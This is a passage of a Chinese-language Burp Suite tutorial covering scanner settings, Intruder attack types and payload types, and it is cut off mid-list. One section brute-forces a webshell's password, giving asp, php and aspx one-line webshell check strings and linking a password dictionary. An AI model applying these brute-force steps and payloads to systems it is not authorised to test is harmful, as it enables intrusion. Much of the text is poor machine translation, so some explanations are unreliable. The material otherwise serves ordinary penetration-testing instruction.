class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Number of threads - 控制并发请求数。</span><br><span class=\"line\">2)Number of retries on network failure - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class=\"line\">3)Pause before retry - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br></pre></td></tr></table></figure>\n\n<p><strong>Throttle between requests</strong> - 在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。</p>\n<p><strong>Add random variations to throttle</strong> - 通过降低您的要求的时序模式进一步增加隐身。</p>\n<p><strong>Follow redirections where necessary</strong>- 有些漏洞只能通过下面的重定向进行检测（例如，在一条错误消息，跨站点脚本这是只有下列一个重定向后退还）。因为某些应用程序的问题重定向到包含您所提交的参数值的第三方网址，BurpSuite保护您免受无意中攻击的第三方应用程序，不按照刚刚收取任何重定向。如果所扫描的要求是明确的目标范围之内（即您使用的是目标范围，以控制哪些被扫描的），然后BurpSuite只会跟随重定向是指同一范围内。如果所扫描的要求不在范围内（即你已经手动发起超出范围的请求的扫描），BurpSuite只会跟随重定向其中（a）是在同一台主机&#x2F;端口的请求被扫描;及（b）没有明确涵盖的范围排除规则（如“logout.aspx”）。</p>\n<p>小心使用这些选项可让您微调扫描引擎，根据不同应用对性能的影响，并在自己的处理能力和带宽。如果您发现该扫描仪运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，让您的扫描进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。如果应用程序的功能是这样的：在一个基地的要求执行的操作干扰其他请求返回的响应，你应考虑减少线程数为1，以确保只有一个单碱基请求被扫描的时间。</p>\n<h3 id=\"Active-Scanning-Optimization\"><a href=\"#Active-Scanning-Optimization\" class=\"headerlink\" title=\"Active Scanning Optimization\"></a>Active Scanning Optimization</h3><p>主动扫描逻辑的行为，以反映扫描的目的和目标应用程序的性质。例如，您可以选择更容易发现问题，在一个大型应用程序的快速扫描;或者您可以执行更慢全面扫描，以发现更难，而且需要更多的扫描请求，以检测问题。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121341699.png\" alt=\"Image079\" title=\"image079.png\"></p>\n<p>下列选项可用：</p>\n<p><strong>Scan speed(扫描速度)</strong> - 该选项决定彻底的某些扫描检查，怎么会检查是否有漏洞时。 “Fast(快速)”设置使更少的请求，并检查一些漏洞更少的推导。在“Thorough(彻底)”的设置使更多的请求，并检查更多的衍生类型的漏洞。 “Normal(正常)”设定为中途在两者之间，并且代表速度和完整性之间的适当折衷对于许多应用。</p>\n<p><strong>Scan accuracy(扫描精度)</strong> - 此选项决定的证据表明，扫描仪会报告某些类型的漏洞之前，要求的金额。可以只使用“blind(盲)”的技术，其中，Burp推断可能存在基于某些观察到的行为，如时间延迟或一个差分响应的一个漏洞被检测到的一些问题。因为这些观察到的行为的发生原因，无论如何，在没有相关联的漏洞的影响，该技术本身更容易出现假阳性比其他技术，例如在观察错误消息。试图减少误报，BurpSuite重复某些测试了一些，当一个假定的问题，推断时间，尝试建立提交的输入和观察到的行为之间有可靠的相关性。的准确性选项用于控制BurpSuite会多少次重试这些测试。在“Minimize false negatives(最小化假阴性)”的设置进行重试较少，因此更可能报告假阳性的问题，但也不太可能会错过由于不一致的应用程序行为的真正问题。在“Minimize false positives(最小化误报)”设置进行更多的试，所以是不太可能报告假阳性的问题，但可能会因此错误地错过了一些真正的问题，因为有些重试请求可能只是碰巧不返回结果是测试。 “Normal(正常)”设置为中途两者之间，并代表之间的假阳性和假阴性的问题合适的权衡对于许多应用。</p>\n<p><strong>Use intelligent attack selection(使用智能进攻选择)</strong> - 此选项使通过省略出现无关紧要给每个插入点参数的基值支票扫描更有效率。例如，如果一个参数值包含不正常出现在文件名中的字符，BurpSuite会跳过文件路径遍历检查此参数。使用这个选项，可以加快扫描件，具有相对低的存在缺少实际的漏洞的风险。</p>\n<h3 id=\"Active-Scanning-Areas\"><a href=\"#Active-Scanning-Areas\" class=\"headerlink\" title=\"Active Scanning Areas\"></a>Active Scanning Areas</h3><p>定义哪些是主动扫描过程中进行检查。是检查以下类别可供选择：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121323228.png\" alt=\"Image081\" title=\"image081.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL injection(SQL注入) - 这有子选项，以使不同的测试技术（误差为基础，延时测试，布尔条件测试） ，并且也使检查特定于单个数据库类型（ MSSQL ，Oracle和MySQL的） 。</span><br><span class=\"line\">OS command injection(操作系统命令注入) - 这有子选项，以使不同的测试技术.。</span><br><span class=\"line\">Reflected XSS(反映了跨站点脚本)</span><br><span class=\"line\">Stored XSS(存储的跨站点脚本)</span><br><span class=\"line\">File path traversal(文件路径遍历)</span><br><span class=\"line\">HTTP header injection(HTTP头注入)</span><br><span class=\"line\">XML/SOAP injection(XML / SOAP注射)</span><br><span class=\"line\">LDAP injection(LDAP注入)</span><br><span class=\"line\">Open redirection(开放重定向)</span><br><span class=\"line\">Header manipulation(头操纵)</span><br><span class=\"line\">Server-level issues服务器级的问题</span><br></pre></td></tr></table></figure>\n\n<p>所执行的每个检查增加的请求的数目，以及每个扫描的总时间。您可以打开或关闭个别检查根据您的应用程序的技术知识。例如，如果你知道某个应用程序不使用任何LDAP ，您可以关闭LDAP注入测试。如果你知道哪个后端数据库的应用程序使用，你可以关闭SQL注入检测特定于其他类型的数据库。您也可以选择性地启用基于你如何严格要求你的扫描是检查。例如，您可以配置BurpSuite做应用程序的快速一次过，只为XSS和SQL注入的网址和参数检查，每漏洞类型更全面的测试在每一个插入点之前。</p>\n<h3 id=\"Passive-Scanning-Areas\"><a href=\"#Passive-Scanning-Areas\" class=\"headerlink\" title=\"Passive Scanning Areas\"></a>Passive Scanning Areas</h3><p>自定义的请求和响应的各个方面在被动扫描检查。下列选项可用：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121316955.png\" alt=\"Image083\" title=\"image083.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Headers--头 </span><br><span class=\"line\">Forms--表格 </span><br><span class=\"line\">Links--链接 </span><br><span class=\"line\">Parameters--参数 </span><br><span class=\"line\">Cookie </span><br><span class=\"line\">MIME类型 </span><br><span class=\"line\">Caching缓存 </span><br><span class=\"line\">Information disclosure--信息披露 </span><br><span class=\"line\">Frameable responses--耐燃反应（“点击劫持”） </span><br><span class=\"line\">ASP.NET的ViewState </span><br><span class=\"line\">需要注意的是被动扫描不会派出自己的任何要求，和每个被动强加检查您的计算机上一个微不足道的处理负荷。不过，你可以禁用检查各个领域，如果你根本就不关心他们，不希望他们出现在扫描结果。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Intruder\"><a href=\"#Intruder\" class=\"headerlink\" title=\"Intruder\"></a>Intruder</h2><p>Burp intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可能出现的。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121336510.png\" alt=\"Image085\" title=\"image085.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121439648.png\" alt=\"Image087\" title=\"image087.png\"></p>\n<p>要开始去了解BurpSuite Intruder，执行以下步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)首先，确保Burp安装并运行，并且您已配置您的浏览器与Burp工作。</span><br><span class=\"line\">2)如果你还没有这样做的话，浏览周围的一些目标应用程序，来填充的应用程序的内容和功能的详细信息Burp的SiteMap。在这样做之前，要加快速度，进入代理服务器选项卡，然后截取子标签，并关闭代理拦截（如果按钮显示为“Intercept is On”，然后点击它来截取状态切换为关闭） 。</span><br><span class=\"line\">3)转到Proxy选项卡，并在History选项卡。发现一个有趣的前瞻性要求，您的目标应用程序，包含了一些参数。选择这个单一的请求，然后从上下文菜单中选择“Send to intruder” 。</span><br><span class=\"line\">4)转到Intruder标签。Burp Intruder可以让你同时配置多个攻击。您Send to Intruder的每个请求在自己的攻击选项卡中打开，而这些都是顺序编号的默认。您可以双击标签头重命名选项卡，拖动标签来重新排序，并且还关闭和打开新的标签页。</span><br><span class=\"line\">5)为您发送请求建立的Intruder选项卡，看看Target和Positions选项卡。这些已经自动填入您发送的请求的细节。</span><br><span class=\"line\">6)Burp Intruder本质工作，采取了基本模板的要求（你送到那里的那个） ，通过一些payloads的循环，将这些payloads送入定义的Positions，基本要求范围内，并发出每个结果的要求。位置标签用于配置，其中有效载荷将被插入到基本要求的位置。你可以看到，BurpSuite一直在你想用来放置有效载荷自动进行猜测。默认情况下，有效载荷放入所有的请求参数和cookie的值。每对有效载荷标记定义了一个有效载荷的位置，并且可以从基体的要求，这将被替换的有效载荷的内容，当该payload position用于括一些文本。有关进一步详情，请参阅Payload Markers的帮助。</span><br><span class=\"line\">7)旁边的请求编辑器中的按钮可以被用于添加和清除有效载荷的标志。试着增加payload position在新的地点请求中，并删除其他标志物，并看到效果了。当你理解了payload positions是如何工作的，请单击“Auto§ ”按钮恢复到BurpSuite为您配置的默认payload positions。如果你修改了请求本身的文本，可以重复步骤3创建与它的原始请求一个新的Intruder的攻击选项卡。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121441372.png\" alt=\"Image089\" title=\"image089.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8)转到Payloads选项卡。这使您可以定义将要放入已定义的有效载荷仓的有效载荷。保持默认设置（使用有效载荷的“Simple list” ） ，并添加一些测试字符串到列表中。您可以通过输入到“Enter a new item”框中，单击“add”，输入自己的字符串。或者您可以使用“add from file”下拉菜单，然后选择“Fuzzing-quick”，从内置的负载串[专业版]列表中。</span><br><span class=\"line\">9)现在，您已经配置了最低限度的选项来发动攻击。转到Intruder菜单，然后选择“Start attack” 。</span><br><span class=\"line\">10)在包含在结果选项卡一个新的窗口中打开攻击。结果表包含已经取得，与各关键细节，如所使用的有效载荷， HTTP状态码，响应长度等，您可以在表中选择任何项目，以查看完整的请求和响应每个请求的条目。您还可以对表进行排序通过单击列标题，并使用过滤器栏过滤表中的内容。这些特征以相同的方式工作，作为Proxy history。</span><br><span class=\"line\">11)这次袭击窗口包含其他标签，显示被用于当前攻击的配置。您可以修改大部分这种配置的攻击已经开始。转到选项选项卡，向下滚动到“ grep-match” ，并勾选“标志的结果与项目相匹配的响应这些表达式” 。这将导致Intruder检查响应匹配列表中的每个表达式项目和标志的火柴。默认情况下，列表显示fuzzing时是很有用的一些常见的错误字符串，但可以配置，如果你想自己的字符串。返回result选项卡，看到Intruder增加了对每个项目列在列表中，而这些包含复选框，指示表达式是否被发现在每一个响应。如果你是幸运的，你的基本模糊测试可能引发一个错误的存在在一些回应的错误消息。</span><br><span class=\"line\">12)现在，在表中选择任何项目，并期待在该项目的响应。发现在反应（如网页标题，或错误消息）一个有趣的字符串。右键单击该项目在表中，然后从上下文菜单中选择“Define extrace grep from response” 。在对话框中，选择响应的有趣字符串，然后单击“确定” 。结果表中现在包含一个新的列，其提取这一段文字从每个响应（其可以是不同的在每一种情况下） 。您可以使用此功能来定位在大型攻击有趣的数据与成千上万的反应。请注意，您还可以配置“extrace grep ”项目中的选项选项卡，在此之前前或在攻击期间。</span><br><span class=\"line\">13)在结果表中选择任一项目，并打开上下文菜单。选择“Send to Repeater” ，然后转到Repeater选项卡。你会看到所选的请求已被复制到Repeater工具，进行进一步的测试。许多其他有用的选项是可用的上下文菜单中。有关发送BurpSuite工具之间的项目，使整体测试工作流程的详细信息。</span><br><span class=\"line\">14)您可以使用“Save”菜单在结果窗口中都救不结果表或整个攻击。你可以加载结果表到其他工具或电子表格程序。您可以通过在主Burp的UI Intruder菜单重新加载保存的攻击。</span><br><span class=\"line\">15)这些步骤只介绍一个简单的用例Intruder，对于Fuzzing的要求有一些标准的攻击字符串和用grep搜索中的错误消息。您可以使用Intruder许多不同类型的攻击，有许多不同的payloads和攻击选项。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Using-Burp-Intruder\"><a href=\"#Using-Burp-Intruder\" class=\"headerlink\" title=\"Using Burp Intruder\"></a>Using Burp Intruder</h3><p>for example 这里我本地搭建一个环境，爆破一个php大马，如果是一句话就把get改成post，如果是php一句话，就在下面加上php这行代码，如图</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121444235.png\" alt=\"Image091\" title=\"image091.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">asp     password=execute(&quot;response.clear:response.write(&quot;&quot;passwordright&quot;&quot;):response.end&quot;)</span><br><span class=\"line\">php     password=execute(&quot;response.clear:response.write(&quot;&quot;elseHelloWorld&quot;&quot;):response.end&quot;)</span><br><span class=\"line\">aspx    password=execute(&quot;response.clear:response.write(&quot;&quot;elseHelloWorld&quot;&quot;):response.end&quot;)。</span><br></pre></td></tr></table></figure>\n\n<p>一般步骤如下</p>\n<p>1.代理好服务器地址，然后访问这个大马地址</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121481236.png\" alt=\"Image093\" title=\"image093.png\"></p>\n<p>2.随后点击forward,并且在大马页面随便输入什么，burp拦截了数据之后发送到repeater</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121481236.png\" alt=\"Image095\" title=\"image095.png\"></p>\n<p>3.切换到repeater选项卡中，点击go按钮，找出一些反馈的错误信息，当然如果不要也可以，这里找错误信息是方便爆破成功了之后便于发现，我这个马反馈的是中文错误信息，显示是乱码就不写了，我们可以通过爆破成功了之后看字节数。 4.接下来就是发送到intruder，target一般都不需要管，已经自动填好了，然后选择positions</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121567189.png\" alt=\"Image097\" title=\"image097.png\"></p>\n<p>先点击Clear$，选择密码地地方点击add$。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121551234.png\" alt=\"Image099\" title=\"image099.png\"></p>\n<p>5.切换到payloads设置payload type，选择我们自己的字典</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121532703.png\" alt=\"Image101\" title=\"image101.png\"></p>\n<p>6.切换到options去设置进程数和失败之后重试次数、过滤结果</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121554609.png\" alt=\"Image103\" title=\"image103.png\"></p>\n<p>一般我都会把Grep-Match清理掉，省得干扰。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121599797.png\" alt=\"Image105\" title=\"image105.png\"></p>\n<p>7.接下来点击intruder下的start attack就开始爆破了，密码admin，我是根据length来判断跟其他的不同</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121647776.png\" alt=\"Image107\" title=\"image107.png\"></p>\n<p>附赠一个webshell字典：<a href=\"https://wooyun.js.org/images_result/images/2014101711121696735.zip\">shellpassword.txt.zip</a></p>\n<h3 id=\"Target\"><a href=\"#Target\" class=\"headerlink\" title=\"Target\"></a>Target</h3><p>用于配置目标服务器进行攻击的详细信息。所需的选项有： Host(主机) - 这是目标服务器的IP地址或主机名。 Port(端口) - 这是HTTP &#x2F; S服务的端口号。 Use HTTPS(使用HTTPS)，这指定的SSL是否应该被使用。 配置这些细节最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder一个新的选项卡，将自动填充的目标和位置选项卡。</p>\n<h3 id=\"Positions\"><a href=\"#Positions\" class=\"headerlink\" title=\"Positions\"></a>Positions</h3><p>用于配置request temlate的攻击，和payloads markers、attack type一起。</p>\n<h3 id=\"Request-Template\"><a href=\"#Request-Template\" class=\"headerlink\" title=\"Request Template\"></a>Request Template</h3><p>主要请求编辑器是用来定义从所有攻击请求都将被导出的请求模板。对于每一个攻击的请求，BurpSuite接受请求的模板，并把一个或多个有效载荷送入由有效载荷标记定义的位置。 成立请求模板的最简单的方法是选择你要攻击中BurpSuite的任何地方的请求，并选择上下文菜单中的“Send to intruder”选项。这将发送选定的请求，在intruder的选项卡，将自动填充的Target和Positions选项卡。</p>\n<h3 id=\"Payload-Markers\"><a href=\"#Payload-Markers\" class=\"headerlink\" title=\"Payload Markers\"></a>Payload Markers</h3><p>有效载荷的标记是使用§字符，并且功能如下放置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)每对标记指定一个有效载荷的位置。</span><br><span class=\"line\">2)一对标记物可以从它们之间任选的模板要求附上一些文字。</span><br><span class=\"line\">3)当一个有效载荷的位置被分配了一个有效载荷，无论是标记和任何包含的文本将被替换为有效载荷。</span><br><span class=\"line\">4)当一个有效载荷的位置不具有分配的有效载荷，该标记将被删除，但是所包含的文本保持不变。</span><br></pre></td></tr></table></figure>\n\n<p>为了使配置更加简单，Intruder会自动突出显示每对有效载荷的标记和任何它们之间包含的文本。</p>\n<p>您可以手动或自动做有效载荷标记。当您从BurpSuite别处发送一个请求到Intruder，Intruder猜测你可能要放置有效载荷，并设置相应的有效载荷标记。您可以修改使用按钮的默认有效载荷标记旁边的请求模板编辑器：</p>\n<p>Add§ - 如果没有文本被选中，该插入一个有效载荷标记在光标位置。如果您已经选择了一些文字，一对标记插入封闭选定的文本。 Clear§ - 这将删除所有的位置标记，无论是从整个模板或模板的选定部分。 Auto§ - 自动放置有效载荷标记。包括价值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)URL查询字符串参数</span><br><span class=\"line\">2)车身参数</span><br><span class=\"line\">3)曲奇饼</span><br><span class=\"line\">4)多重参数属性（例如，在文件上传的文件名）</span><br><span class=\"line\">5)XML数据和元素属性</span><br><span class=\"line\">6)JSON参数</span><br></pre></td></tr></table></figure>\n\n<p>您可以配置自动负载位置是否将更换或追加到现有的参数值，通过入侵者菜单上的选项。需要注意的是，如果一个子部分的要求，但不是整个消息体，包含格式化数据使用XML或JSON ，可以自动通过这种结构中的位置的有效载荷手动选择格式化数据的准确块，并使用“自动”按钮在其定位的有效载荷。这是有用的，例如，当一个多参数的值包含在XML或JSON格式数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">刷新 - 这将刷新请求模板编辑器的语法彩色化，如果必要的。</span><br><span class=\"line\">清除 - 这会删除整个请求模板。</span><br></pre></td></tr></table></figure>\n\n<p>注意：您也可以使用入侵者的有效载荷仓的UI通过BurpSuite扫描仪配置自定义插入点主动扫描。要做到这一点，配置请求模板和有效载荷在标记内入侵者通常的方式，然后选择从入侵者菜单中的“主动扫描定义插入点” 。</p>\n<h3 id=\"Attack-type\"><a href=\"#Attack-type\" class=\"headerlink\" title=\"Attack type\"></a>Attack type</h3><p>Burp Intruder支持各种攻击类型 - 这些决定在何种负载分配给有效载荷仓的方式。攻击类型可以使用请求模板编辑器上方的下拉菜单进行选择。以下攻击类型可供选择：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121998569.png\" alt=\"Image109\" title=\"image109.png\"></p>\n<p>Sniper(狙击手) - 这将使用一套单一的payloads。它的目标依次在每个有效载荷的位置，并把每个有效载荷送入依次那个位置。这不是针对一个给定的请求的位置不受影响 - 位置标记被移除，并在它们之间出现在模板中任何封闭文本保持不变。这种攻击类型为个别模糊测试的一些请求参数常见的漏洞非常有用。在攻击中生成的请求的总数是位置的数目和在有效载荷中设定的有效载荷的数量的乘积。</p>\n<p>Battering ram(撞击物) - 使用一组payload。通过迭代的有效载荷方式，并将相同的payloads再一次填充到所有已定义的有效载荷仓。当其中一个攻击需要相同的输入将被插入在多个地方在请求中（例如，一个Cookie中的用户名和cookie参数）对这种攻击类型是非常有用的。在攻击中生成的请求的总数是有效载荷的有效载荷中设定的数目。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121992842.png\" alt=\"Image111\" title=\"image111.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711121957831.png\" alt=\"Image113\" title=\"image113.png\"></p>\n<p>例如生成一组数字1-9，则就是1-1 ，2-2，3-3这种形式 Pitchfork(相交叉) - 这将使用多个payloads集。有对每个定义的位置（最多20个）不同的有效载荷组。通过设置所有有效载荷的攻击迭代的方式，并将一个有效载荷到每个定义的位置。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122127325.png\" alt=\"Image115\" title=\"image115.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122150222.png\" alt=\"Image117\" title=\"image117.png\"></p>\n<p>例如设置多个，每个payload设置一个字典，则就是1-1-1，2-2-2，3-3-3这种形式</p>\n<p>换句话说，第一个请求将放置第一个有效载荷的Payload set 1到Positions 1 ，并从有效载荷中的第一个Payload set 2到Positons 2 ;第二个请求将放置第二个Payload set 1到Positions 1 ，并从payload中的第二个Payload set 2到Postions2 ，等在那里的攻击需要不同但相关的输入进行插在多个地方，这种攻击类型是有用的请求（例如，用户名中的一个参数，和对应于该用户名中的另一个参数已知的ID号） 。在攻击中生成的请求的总数是有效载荷中的最小有效载荷组的数目。</p>\n<p>Cluster bomb(集束炸弹) - 使用多个Payload sets。有对每个定义的Positions（最多20个）设置不同的payload set。通过每个有效载荷的攻击迭代依次设置，使有效载荷组合的所有排列进行测试。</p>\n<p>例如设置三个字典都是10个数，则总共有1000总匹配的模式</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122189353.png\" alt=\"Image119\" title=\"image119.png\"></p>\n<p>也就是说，如果有两个有效载荷的位置，则该攻击将放置第一个有效载荷从payload set 2到Positions 2 ，并通过在有效负载的所有 payload set 1中的positions 1 ;然后它将第二个有效载荷从载荷设置2到位置2 ，并通过有效载荷全部载入循环设置1到位置1 。其中一个攻击需要不同的和无关的或未知输入要在多个地方插入这种类型的攻击是非常有用的在请求中（例如猜测凭证，在一个参数的用户名，并且在另一个参数密码时） 。在攻击中生成的请求的总数是在所有定义的有效载荷的有效载荷集的数目的乘积 - 这可能是非常大的。</p>\n<h2 id=\"Payloads\"><a href=\"#Payloads\" class=\"headerlink\" title=\"Payloads\"></a>Payloads</h2><h3 id=\"Types\"><a href=\"#Types\" class=\"headerlink\" title=\"Types\"></a>Types</h3><p>Burp Intruder包含以下几种attack type:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Simple list--简单字典</span><br><span class=\"line\">Runtime file--运行文件</span><br><span class=\"line\">Custom iterator--自定义迭代器</span><br><span class=\"line\">Character substitution--字符替换</span><br></pre></td></tr></table></figure>\n\n<p>此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。 用户界面允许您配置了一些字符替换。当执行攻击，有效载荷类型工程通过逐一配置的列表项。对于每个项目，它产生一个数的有效载荷，根据所定义的取代基包括取代的字符的所有排列。例如，默认替换规则（其中包括e&gt;3且t&gt;7），该项目“peter”将产生以下的有效载荷：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">peter</span><br><span class=\"line\">p3ter</span><br><span class=\"line\">pe7er</span><br><span class=\"line\">p37er</span><br><span class=\"line\">pet3r</span><br><span class=\"line\">p3t3r</span><br><span class=\"line\">pe73r</span><br><span class=\"line\">p373r</span><br></pre></td></tr></table></figure>\n\n<p>Case modification–此负载类型允许您配置一个字符串列表，并应用各种情况下修改每个项目。这可能是密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。 可以选择以下的情况下修改规则：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No change - 这个项目可以用不被修改。 </span><br><span class=\"line\">To lower case- 在该项目的所有字母转换为小写。 </span><br><span class=\"line\">To upper case - 在该项目的所有字母转换为大写。 </span><br><span class=\"line\">To Propername - 在该项目的第一个字母转换为大写，以及随后的字母转换为小写。 </span><br><span class=\"line\">To ProperName - 在该项目的第一个字母转换为大写，以及随后的字母都不会改变。</span><br></pre></td></tr></table></figure>\n\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Peter Wiener</span><br><span class=\"line\">peter wiener</span><br><span class=\"line\">PETER WIENER</span><br><span class=\"line\">Peter wiener</span><br></pre></td></tr></table></figure>\n\n<p>选项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Recursive grep--递归grep</span><br><span class=\"line\">Illegal Unicode--非法的Unicode</span><br><span class=\"line\">Character blocks--字符块</span><br><span class=\"line\">Numbers--数字</span><br><span class=\"line\">Dates--日期</span><br><span class=\"line\">Brute forcer--暴力</span><br><span class=\"line\">Null payloads--空的有效负载</span><br><span class=\"line\">Character frobber--性格frobber</span><br><span class=\"line\">Bit flipper--位翻转</span><br><span class=\"line\">Username generator--用户名生成器</span><br><span class=\"line\">ECB block shuffler--欧洲央行座洗牌</span><br><span class=\"line\">Extension-generated--扩展生成</span><br><span class=\"line\">Copy other payload--复制其它有效负载</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Processing\"><a href=\"#Processing\" class=\"headerlink\" title=\"Processing\"></a>Processing</h3><p>由配置的有效载荷类型生成的有效载荷可以使用各种有效载荷的处理规则和有效负载编码可以进一步操纵。</p>\n<h4 id=\"1-Payload-Processing-Rules\"><a href=\"#1-Payload-Processing-Rules\" class=\"headerlink\" title=\"1)Payload Processing Rules\"></a>1)Payload Processing Rules</h4><p>在它被使用之前可以定义规则来对每个有效载荷执行各种处理任务。该定义的规则按顺序执行，并且可以打开和关闭，以帮助调试与配置的任何问题。有效载荷的处理规则是有用的在多种情况下，你需要生成不同寻常的有效载荷，或者需要在一个更广泛的结构或在使用前编码方案包的有效载荷可达。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122171902.png\" alt=\"Image121\" title=\"image121.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Add prefix - 添加一个文字前缀</span><br><span class=\"line\">Add suffix - 添加一个文字后缀</span><br><span class=\"line\">Match/replace - 